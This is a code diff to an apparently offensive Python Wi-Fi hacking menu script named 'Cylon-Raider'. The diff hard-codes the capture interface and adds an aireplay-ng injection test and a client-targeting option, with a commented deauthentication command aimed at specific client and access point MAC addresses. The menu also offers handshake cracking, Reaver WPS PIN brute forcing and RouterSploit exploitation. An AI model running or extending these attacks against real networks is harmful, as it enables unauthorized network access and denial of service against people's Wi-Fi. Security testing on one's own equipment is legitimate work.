@@ -14,15 +14,16 @@ sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets windo
 os.system('cat /root/Cylon-Raider/cylonraider_banner.txt')
 # os.system('cat /root/Cylon-Raider/banner_CrackHead.txt')
 def airmon(): #No need for classes here, just one variable
-    capture_Interface = str(raw_input("Enter the wireless INTERFACE that you want to capture with: "))
-    cmd_String = "airmon-ng start %s" % capture_Interface
+    # capture_Interface = str(raw_input("Enter the wireless INTERFACE that you want to capture with: "))
+    capture_Interface = 'wlan1'
+    cmd_String = "airmon-ng start wlan1"
     print cmd_String
     os.system(cmd_String)
     #sample Join syntax (joins on the LEFT)
     # print ()"\n\t".join(capture_Interface))
     mon_String = "mon"
     airodump_String = capture_Interface + mon_String
-    print 'Your airodump interface is... %s' % airodump_String
+    print 'Your airodump interface is... wlan1mon'
     print "Remember this string for the next step, AIRODUMP"
     main()
     return
@@ -102,6 +103,25 @@ def Decloaker():
     main()
     return
 
+def injection_test():
+    # syntax
+    # # aireplay-ng -9 -a C6:9f:db:8f:e6:15 wlan0mon --ignore-negative-one
+
+    # test_target = str(raw_input("Enter the MAC address of your target or '-i wlan0' to test against your own internal wireless card: "))
+    os.system('airmon-ng start wlan1')
+    cmd_String = "aireplay-ng -9 wlan1mon --ignore-negative-one"
+    print cmd_String
+    os.system(cmd_String)
+    main()
+    return
+
+def client_mac_targeting():
+# syntax
+# aireplay-ng --deauth 1000 -c 9C:d2:1e:61:8b:a1 -a 80:2a:a8:1b:e9:29 --ignore-negative-one wlan1mon
+
+    os.system("gnome-terminal -e 'bash -c \"python /root/Cylon-Raider/Client_Mac_Targeting.py; exec bash\"'")
+    main()
+    return
 def main():
     opt_List = [
         '\n\t#1. AIRMON, start up the capture interface',
@@ -110,7 +130,9 @@ def main():
         '#4. AIRCRACK, attempt to crack the 4-way handshake with a wordlist (dictionary attack)',
         '#5. HEAVY-RAIDER, run Reaver, the WPS Protection PIN brute forcer',
         '#6. RSF, run Router-Sploit, for exploitation stages of Wi-Fi Hacking',
-        '#7. HIDDEN NETWORK DECLOAKER, adapted from Violent Python by TJ OConnor'
+        '#7. HIDDEN NETWORK DECLOAKER, adapted from Violent Python by TJ OConnor',
+        '#8. ARP Injection Test, See if your external wireless card could inject packets',
+        '#9. AIREPLAY, Client MAC Addr Targeting, Target the connected client instead of the AP (may work better in capturing handshake)'
     ]
 
     print ("\n\t".join(opt_List))
@@ -137,6 +159,12 @@ def main():
     elif opt_Choice == "7":
         os.system('clear')
         Decloaker()
+    elif opt_Choice == "8":
+        os.system('clear')
+        injection_test()
+    elif opt_Choice == "9":
+        os.system('clear')
+        client_mac_targeting()
     else:
         print 'You have entered a invalid option'
         main()
